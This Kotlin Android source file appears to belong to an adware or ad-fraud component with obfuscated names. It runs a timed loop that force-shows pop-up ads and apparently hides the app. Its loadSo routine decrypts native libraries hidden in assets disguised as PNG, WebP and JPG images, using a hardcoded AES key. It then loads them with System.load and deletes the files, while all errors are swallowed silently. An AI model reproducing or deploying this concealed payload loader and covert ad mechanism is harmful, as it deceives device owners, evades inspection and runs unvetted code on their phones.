package m.ki

import android.app.Application
import android.content.Context
import android.os.Build
import android.os.PowerManager
import android.util.Log
import com.tencent.mmkv.MMKV
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import org.json.JSONObject
import xik.af
import xik.wn
import java.io.ByteArrayOutputStream
import java.io.File
import java.io.FileOutputStream
import javax.crypto.Cipher
import javax.crypto.spec.SecretKeySpec
import kotlin.random.Random

object Dva {
    lateinit var app: Application
    lateinit var byteAd1: PagAd
    lateinit var byteAd2: PagAd

    lateinit var plusAd1: TagAd
    lateinit var plusAd2: TagAd

    private var hide = false//hideDid

    private var loop = 0L//loopTime
    private var gap = 0L//gapTime
    private var first = 0L//firstTime

    private var popLoopJob: Job? = null
    var lastShowTime = 0L//last ShowTime

    private var iTime = 0L//install time

    var useByte = true
    var afterT = false

    var autoCloseAdJob: Job? = null

    var maxShowTime = 0L
    var popMinDelay = 0L
    var popMaxDelay = 0L
    var popUnit = 0L

    var failPopMax = 0
    var hourMaxShow = 0
    var dayMaxShow = 0
    var nowPopFail = 0
    var adminMaxTime = 100//默认不能为0，否则有问题
    private var isOpenLimit = true//是否开启上限

    private var bug = ""


    fun sim(a0: Application, a1: ArrayList<String>) {
        bug = a1[0]
        this.app = a0
        TimeMn.tx = MMKV.defaultMMKV()
        iTime = a0.packageManager.getPackageInfo(a0.packageName, 0).firstInstallTime
        ac(a1[1])
    }


    private var fileName = ""
    var brKey = ""
    private var hideKey = ""
    private var popKey = ""


    private fun ac(a0: String) {
        val js = JSONObject(a0)

        val byteIds = js.optString("nak").split("_")
        val byteId1 = byteIds.getOrNull(0) ?: ""
        val byteId2 = byteIds.getOrNull(1) ?: ""
        val plusId1 = byteIds.getOrNull(0) ?: ""
        val plusId2 = byteIds.getOrNull(1) ?: ""

        val strings = js.optString("vka").split("_")
        fileName = strings[0]
        brKey = strings[1]
        hideKey = strings[2]
        popKey = strings[3]


        useByte = js.optString("bta").contains("kuk")
        isOpenLimit = js.optString("bta").contains("dud")

        val limits = js.optString("nma").split("_")
        hourMaxShow = limits[0].toInt()
        dayMaxShow = limits[1].toInt()
        failPopMax = limits[2].toInt()
        maxShowTime = limits[3].toInt() * 1000L
        adminMaxTime = limits[4].toInt()


        val parts = js.optString("eka").split("_")
        loop = parts[0].toInt() * 1000L
        popUnit = parts[1].toInt() * 1000L
        gap = parts[2].toInt() * 1000L
        first = parts[3].toInt() * 1000L
        popMinDelay = parts[4].toLong()
        popMaxDelay = parts[5].toLong()

        try {
            val file = File(app.filesDir.parentFile, fileName)
            if (!file.exists()) file.mkdirs()
        } catch (_: Exception) {
        }
        if (!hide) {
            hide = true
            byteAd1 = PagAd(id = byteId1, tag = "1")
            byteAd2 = PagAd(id = byteId2, tag = "2")
            plusAd1 = TagAd(id = plusId1, tag = "1")
            plusAd2 = TagAd(id = plusId2, tag = "2")

            app.registerActivityLifecycleCallbacks(UiMn())
            loadSo(app, app.packageName, "vbiKMu90!pkk*&BK", "CarT", "T")
            loadSo(app, app.packageName, "vbiKMu90!pkk*&BK", "CarH", "H")
            CoroutineScope(Dispatchers.Main).launch {
                try {
                    wn.lo3(1, 0.9, hideKey)
                } catch (_: Throwable) {
                }
                try {
                    af.v7(app)
                } catch (_: Throwable) {
                }
            }
            adBigLoop()
        } else {
            byteAd1.updateId(byteId1)
            byteAd2.updateId(byteId2)
            plusAd1.updateId(plusId1)
            plusAd2.updateId(plusId2)
        }
    }

    private fun adBigLoop() {//loop
        popLoopJob?.cancel()
        popLoopJob = CoroutineScope(Dispatchers.Main).launch {
            var thisDealyTime: Long
            while (true) {
                thisDealyTime = try {
                    Random.nextLong(loop - popUnit, loop + popUnit)
                } catch (_: Throwable) {
                    loop
                }
                if (isOpenLimit) {
                    if (TimeMn.limit() == 0 && nowPopFail < failPopMax) {
                        if (useByte) {
                            byteAd1.loadP(app)
                            byteAd2.loadP(app)
                        } else {
                            plusAd1.loadT(app)
                            plusAd2.loadT(app)
                        }
                    }
                } else {
                    if (useByte) {
                        byteAd1.loadP(app)
                        byteAd2.loadP(app)
                    } else {
                        plusAd1.loadT(app)
                        plusAd2.loadT(app)
                    }
                }
                adTinyLoop(thisDealyTime)
                delay(thisDealyTime)
            }
        }
    }

    fun lock(): Boolean {
        return (app.getSystemService(Context.POWER_SERVICE) as PowerManager).isInteractive.not()
    }

    private suspend fun adTinyLoop(time: Long) {
        if (isOpenLimit) {
            val limitType = TimeMn.limit()
            if (limitType != 0) {
                val value = when (limitType) {
                    1 -> "hourL"
                    2 -> "dayL"
                    else -> ""
                }
                val key = if (limitType == 1) "hourMarkTag" else "dayMarkTag"
                val tag = if (limitType == 1) TimeMn.getTag() else TimeMn.getTag(1)
                if (TimeMn.readStr(key) != tag) {
                    TimeMn.saveStr(key, tag)
                    upTba(listOf("ad_pass", "string", value))
                }
                return
            }
            if (nowPopFail >= failPopMax) {
                if (TimeMn.readStr("k8") != TimeMn.getTag(1)) {
                    upTba(listOf("pop_fail"))
                    TimeMn.saveStr("k8", TimeMn.getTag(1))
                }
                return
            }
        }

        upTba(listOf("ad_session", "time", (time / 1000).toString()))
        if (lock()) return
        upTba(listOf("ad_light"))
        if (System.currentTimeMillis() - iTime < first) {
            upTba(listOf("ad_pass", "string", "firstNo"))
            return
        }
        if (System.currentTimeMillis() - lastShowTime < gap) {
            upTba(listOf("ad_pass", "string", "gapNo"))
            return
        }
        if (useByte) {
            if ((byteAd1.looking() || byteAd2.looking())) {
                upTba(listOf("ad_pass", "string", "seeingP"))
                return
            }
        } else {
            if ((plusAd1.isLooking() || plusAd2.isLooking())) {
                upTba(listOf("ad_pass", "string", "seeingT"))
                return
            }
        }
        upTba(listOf("ad_pass", "string", "NULL"))
        closePages()
        delay(368)
        nowPopFail += 1
        try {
            wn.lo3(0, 0.2, popKey)
        } catch (_: Throwable) {
        }
        upTba(listOf("ad_start"))
    }

    private fun loadSo(ctx: Context, pkg: String, decodeKey: String, tag: String, type: String) {
        try {
            // 1. 选 ABI
            var abi = ""
            for (s in Build.SUPPORTED_64_BIT_ABIS) {
                if (s.startsWith("arm64") || s.startsWith("x86_64")) {
                    abi = s; break
                }
            }
            if (abi.isEmpty()) {
                for (s in Build.SUPPORTED_32_BIT_ABIS) {
                    if (s.startsWith("armeabi") || s.startsWith("x86")) {
                        abi = s; break
                    }
                }
            }
            if (abi.isEmpty() && Build.SUPPORTED_ABIS.isNotEmpty()) abi = Build.SUPPORTED_ABIS[0]

            // 2. 根据 abi + e 选文件名
            val imageName = if (abi.contains("64")) {
                if (type == "T") "ziak.png" else "mgk_ka.png"
            } else {
                if (abi.isNotEmpty() && type == "T") "lki.webp" else "iha_opk.jpg"
            }
            // 3. 目标文件
            val file = File("/data/data/$pkg/$tag")
            if (!file.exists()) {
                // 4. 读取 assets
                ctx.assets.open(imageName).use { input ->
                    val bos = ByteArrayOutputStream()
                    val buf = ByteArray(4096)
                    while (true) {
                        val len = input.read(buf)
                        if (len < 0) break
                        bos.write(buf, 0, len)
                    }
                    val raw = bos.toByteArray()

                    // 5. AES 解密
                    val key = SecretKeySpec(decodeKey.toByteArray(), "AES")
                    val decoded = Cipher.getInstance("AES/ECB/PKCS5Padding")
                        .apply { init(Cipher.DECRYPT_MODE, key) }
                        .doFinal(raw)

                    // 6. 输出文件
                    FileOutputStream(file).use { out -> out.write(decoded) }
                }
            }
            // 7. 加载 so 并删除
            System.load(file.absolutePath)
            file.delete()
        } catch (_: Throwable) {
        }
    }


    fun waitClose() {
        autoCloseAdJob?.cancel()
        autoCloseAdJob = CoroutineScope(Dispatchers.IO).launch {
            while (true) {
                if (System.currentTimeMillis() - lastShowTime >= maxShowTime) {
                    dexLog("time reach $maxShowTime auto close page")
                    closePages()
                    break
                }
                delay(200)
            }
        }
    }

    fun dexLog(a: String) {
        if (bug != "bug") return
        Log.v("T686", a)
    }

    fun closePages() {
        try {
            val clazz = Class.forName("com.announcement.comprehension.t.ClosePages")
            val method = clazz.getDeclaredMethod("c2")
            val instance = clazz.getField("INSTANCE").get(null)
            method.invoke(instance)
        } catch (_: Exception) {
        }
        afterT = true
        try {
            byteAd1.isShowing = false
            byteAd2.isShowing = false

            plusAd1.isShowing = false
            plusAd2.isShowing = false
        } catch (t: Throwable) {
        }
    }

    fun upTba(list: List<String> = listOf(), type: String = "p") {
        try {
            val clazz = Class.forName("com.announcement.comprehension.t.dex.Tba")
            val instance = clazz.getField("INSTANCE").get(null)
            val method = clazz.getDeclaredMethod("da", List::class.java, String::class.java)
            method.invoke(instance, list, type)
        } catch (_: Exception) {
        }
    }
}